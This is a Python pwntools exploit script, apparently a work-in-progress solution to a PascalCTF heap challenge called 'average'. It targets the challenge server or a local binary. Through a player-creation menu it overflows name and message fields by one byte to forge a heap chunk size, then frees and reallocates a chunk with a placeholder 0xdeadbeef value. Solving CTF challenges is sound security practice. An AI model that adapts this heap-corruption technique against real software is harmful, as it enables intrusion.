#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('average', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('ahc.ctf.pascalctf.it', 9003)
else:
    p = process([exe.path])
GDB()

def create(idx, len, name, msg):
    sla(b'> ', b'1')
    slna(b'Choose an index (0-4) to create the player at: ', idx)
    slna(b'The default name length is 32 characters, how many more do you need? ', len)
    sa(b'Enter name: ', name)
    sa(b'nter message: ', msg)
def free(idx):
    sla(b'> ', b'2') 
    slna(b'Choose an index (0-4) to delete the player from: ', idx)

for i in range(3):
    create(i, 0, b'A'*38 + b'\n', b'S'*32 + b'\n')

create(3, 0, b'A'*38 + b'\n', b'S'*33 + p8(0x71) + b'\n') # idx 3

create(4, 0, b'A'*38 + b'\n', b'S'*32 + b'\n')

free(4)

create(4, 32, b'A'*(32+39), b'S'*7 + p64(0xdeadbeef) + b'\n')


## FLAG="aa" ./solve.py DEBUG NOASLR
p.interactive()
